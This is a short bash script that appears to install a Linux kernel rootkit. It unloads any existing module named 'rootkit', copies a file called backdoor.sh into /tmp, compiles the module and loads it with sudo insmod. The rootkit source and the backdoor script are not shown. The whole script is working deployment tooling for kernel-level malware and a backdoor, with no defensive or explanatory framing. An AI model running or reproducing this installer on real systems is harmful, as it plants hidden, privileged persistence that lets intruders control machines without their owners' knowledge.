#!/bin/bash

#make clean

already=$(lsmod | grep rootkit)
if [ -n "$already" ]; then
    echo "Removing already present rootkit"
    sudo rmmod rootkit
fi

cp backdoor.sh /tmp/

make

if [ $? -eq 0 ]; then
	sudo insmod rootkit.ko

	if [ $? -eq 0 ]; then
		echo "Done"
	else
		echo "FAIL insmod"
	fi
else
	echo "FAIL make"
fi

